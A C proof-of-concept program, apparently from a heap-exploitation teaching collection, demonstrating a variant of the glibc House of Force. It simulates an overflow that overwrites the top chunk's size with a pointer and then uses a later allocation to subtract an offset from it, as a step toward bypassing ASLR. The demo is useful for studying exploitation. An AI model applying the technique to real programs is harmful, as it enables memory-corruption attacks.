#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>


int main() {
  fprintf(
    stderr,
    "\n"
    "This technique is a variation on the House of Force.\n"
    "\n"
    "The idea of the House of Force is to overwrite the size of the top chunk with a\n"
    "very large number, so that a subsequent large allocation will add an arbitrary\n"
    "offset of our choice to the address of the top chunk. In the House of Force, this\n"
    "is used to control the address of the next allocation.\n"
    "\n"
    "Here, we will instead use the size of the chunk to do arithmetic. To defeat ASLR,\n"
    "we often need to do some simple arithmetic on a pointer. For example, we might\n"
    "have a vulnerability which enables us to read the address of a libc function, but\n"
    "we need to subtract a fixed offset from that pointer to get a pointer to the\n"
    "system function. The idea is to use the size of the top chunk to compute the\n"
    "subtraction.\n"
    "\n"
  );

  char* p = malloc(0x800);
  fprintf(
    stderr,
    "First let's allocate a large chunk: %p\n\n"
    "The address of the top chunk is now %p, "
    "and its size is %p.\n\n",
    p,
    &p[0x800],
    *(char**)&p[0x800 + sizeof(size_t)]
  );

  char stackaddr[16];
  char* s = &stackaddr[0];
  fprintf(
    stderr,
    "Let's emulate a vulnerability which can overwrite the size of the top chunk with\n"
    "a pointer. For this example, we'll use a stack address: %p\n\n",
    s
  );

  // ----- VULNERABILITY ----
  // Use a buffer overflow to overwrite the size of the top chunk.
  memset(p, 0, 0x800 + 2 * sizeof(size_t));
  *(char**)&p[0x800 + sizeof(size_t)] = s;
  // ------------------------

  fprintf(
    stderr, "The size of the top chunk is now: %p\n\n",
    *(char**)&p[0x800 + sizeof(size_t)]
  );

  char* q = malloc(0x1000 - 2 * sizeof(size_t));
  fprintf(stderr, "Now let's allocate a chunk of size 0x1000: %p\n\n", q);

  char* addr = *(char**)&q[0x1000 - sizeof(size_t)];
  fprintf(
    stderr,
    "The size of the top chunk is now: %p.\n"
    "That's the original address minus 0xfff.\n"
    "We can use a second vulnerability, like an out-of-bounds read, to access it.\n"
    "\n"
    "There's a slight issue though because we would have preferred to subtract 0x1000,\n"
    "rather than 0xfff, and we are limited to multiples of 0x%x due to the chunk size\n"
    "granularity. The least significant bit of the size is the PREV_INUSE bit, so it\n"
    "has been set. There are two solutions to this. The first solution is to use the\n"
    "buffer overflow again to overwrite the least significant byte of the address.\n"
    "Since ASLR does not affect the least significant 12 bits of an address, we usually\n"
    "know what value we want the least significant byte to be. The second solution is\n"
    "to write the address one byte higher in memory, thereby multiplying the size of the\n"
    "top chunk by 0x100. This second solution is only possible if our vulnerability\n"
    "allows us to an unaligned address. But it has the additional benefit that it gives\n"
    "us better granularity on the subtraction, because we are no longer limited to\n"
    "multiples of 0x%x.\n",
    addr,
    (int)(2 * sizeof(size_t)),
    (int)(2 * sizeof(size_t))
  );

  return 0;
}
